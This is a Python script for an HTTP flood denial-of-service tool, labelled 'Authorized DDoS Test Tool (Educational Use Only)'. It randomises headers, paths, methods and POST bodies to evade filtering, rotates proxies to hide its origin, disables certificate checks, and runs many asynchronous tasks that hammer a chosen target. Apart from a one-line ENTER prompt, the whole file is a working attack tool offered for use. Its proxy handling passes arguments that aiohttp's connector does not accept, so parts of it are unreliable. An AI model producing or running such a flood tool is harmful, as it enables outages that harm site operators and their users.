import socket
import ssl
import asyncio
import random
import argparse
import json
import urllib.parse
from urllib.parse import urlparse
import aiohttp
import socks  # Requires PySocks: pip install pysocks

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

ACCEPT_LANGUAGES = ["en-US,en;q=0.9", "fr-FR;q=0.8", "es-ES;q=0.7"]
ACCEPT_ENCODINGS = ["gzip, deflate", "br"]

async def generate_request(target_domain):
    """Generate randomized HTTP requests (GET/POST/HEAD/OPTIONS)"""
    path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=8))
    method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
    headers = {
        "Host": target_domain,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
        "Referer": f"http://{target_domain}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))}",
        "Connection": "keep-alive",
    }

    if method == "POST":
        content_type = random.choice(["application/x-www-form-urlencoded", "application/json"])
        post_data = generate_post_data(content_type)
        headers["Content-Type"] = content_type
        headers["Content-Length"] = str(len(post_data))
        request = f"{method} {path} HTTP/1.1\r\n"
        request += "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
        request = request.encode() + post_data
    else:
        request = f"{method} {path} HTTP/1.1\r\n"
        request += "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
        request = request.encode()

    return request

def generate_post_data(content_type):
    """Generate randomized POST payloads"""
    data = {f"field_{i}": "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=8)) for i in range(random.randint(1, 5))}
    if content_type == "application/json":
        return json.dumps(data).encode()
    else:
        return urllib.parse.urlencode(data).encode()

async def attack_task(target_domain, target_ip, target_port, proxy, stop_event):
    """Asynchronous attack task with proxy support"""
    while not stop_event.is_set():
        try:
            # Configure proxy
            if proxy:
                proxy_type, proxy_host, proxy_port = proxy
                conn = aiohttp.TCPConnector(
                    ssl=False,
                    proxy_type=proxy_type,
                    proxy=proxy_host,
                    proxy_port=proxy_port
                )
            else:
                conn = aiohttp.TCPConnector(ssl=False)

            async with aiohttp.ClientSession(connector=conn) as session:
                # Handle HTTPS with SNI
                if target_port == 443:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                else:
                    ssl_context = None

                # Send multiple requests per connection
                for _ in range(random.randint(50, 100)):
                    try:
                        request = await generate_request(target_domain)
                        async with session.post(
                            f"http://{target_ip}:{target_port}",
                            data=request,
                            timeout=5,
                            ssl=ssl_context
                        ) as resp:
                            await resp.read()
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    except:
                        break

        except Exception as e:
            await asyncio.sleep(0.5)

async def main():
    parser = argparse.ArgumentParser(description="Authorized DDoS Test Tool (Educational Use Only)")
    parser.add_argument("target", help="Target domain or IP (e.g., 'example.com')")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=100, help="Number of async tasks (default: 100)")
    parser.add_argument("--proxy-file", help="File containing proxies (format: type:host:port per line)")
    args = parser.parse_args()

    # Resolve target IP
    target_domain = args.target
    target_ip = socket.gethostbyname(target_domain)
    target_port = args.port

    # Load proxies
    proxies = []
    if args.proxy_file:
        with open(args.proxy_file) as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) == 3:
                    proxy_type = getattr(socks, parts[0].upper(), socks.HTTP)
                    proxies.append((proxy_type, parts[1], int(parts[2])))

    # Safety checks
    print(f"""
    =====================================================
    WARNING: This script will perform a simulated DDoS attack
    Target: {target_domain} ({target_ip}:{target_port})
    Threads: {args.threads}
    Proxies: {len(proxies)} loaded
    =====================================================
    """)
    input("Press ENTER to confirm you have authorization to test this target...")

    # Start attack
    stop_event = asyncio.Event()
    tasks = []
    for _ in range(args.threads):
        proxy = random.choice(proxies) if proxies else None
        task = asyncio.create_task(attack_task(
            target_domain,
            target_ip,
            target_port,
            proxy,
            stop_event
        ))
        tasks.append(task)

    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopping attack...")

if __name__ == "__main__":
    asyncio.run(main())
